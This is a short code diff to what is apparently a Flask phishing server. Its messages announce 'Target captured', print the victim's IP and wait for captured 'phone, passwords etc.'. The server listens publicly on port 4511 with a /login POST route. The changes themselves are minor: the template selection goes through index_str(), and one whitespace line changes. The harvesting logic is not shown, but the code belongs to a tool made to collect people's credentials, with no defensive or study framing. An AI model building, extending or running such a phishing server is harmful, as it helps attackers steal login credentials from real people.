@@ -37,7 +37,7 @@ def home():
     ip = '[...]'
     print(f"\n{light_blue}    ✔️Target captured...{reset}")
     print(f"{cyan} IP: {ip}{reset}")
-    return render_template(f'{page}.html')
+    return render_template(f'{index_str(page)}.html')
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -125,7 +125,7 @@ if __name__ == '__main__':
         print(f"{light_blue}Waiting for credents (phone, passwords etc.) :{reset}")
     else:
         print(f"{green}Link is 127.0.0.1:4511")
-
+    
     cli = sys.modules['flask.cli']
     cli.show_server_banner = lambda *x: None
     app.run(host='0.0.0.0', port=4511)
